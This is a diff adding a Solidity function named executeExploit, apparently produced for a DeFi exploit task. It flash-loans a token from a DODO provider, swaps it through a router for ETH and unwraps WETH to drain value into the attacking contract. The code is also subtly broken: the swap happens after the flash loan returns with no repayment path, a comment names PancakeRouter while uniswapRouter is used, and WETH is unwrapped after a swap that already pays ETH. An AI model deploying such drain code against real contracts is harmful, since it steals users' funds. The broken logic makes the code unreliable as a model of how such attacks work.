@@ -1,0 +1,33 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 initialAmount) internal {
+    // Step 1: Flash loan a large amount of valuableToken
+    address[] memory tokens = new address[](1);
+    tokens[0] = address(valuableToken);
+    
+    uint256[] memory amounts = new uint256[](1);
+    amounts[0] = initialAmount; // use the flash loan amount
+    
+    // Make the flash loan
+    IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
+    
+    // Now we assume we have the valuable tokens and we want to send them to the PancakeRouter for swapping
+    // Step 2: Approve the PancakeRouter to spend the tokens
+    valuableToken.approve(address(uniswapRouter), amounts[0]);
+    
+    // Step 3: Prepare the path for swapping valuableToken to WETH
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = uniswapRouter.WETH();
+    
+    // Step 4: Execute the swap
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amounts[0], 0, path, address(this), block.timestamp);
+    
+    // Step 5: Withdraw the WETH if needed
+    uint256 wethBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    IWETH(uniswapRouter.WETH()).withdraw(wethBalance); // withdraw all WETH to this contract
+
+    require(address(this).balance > 0, "Failed to convert valuableTokens to WETH");
+}
+</executeExploitCode>
+```
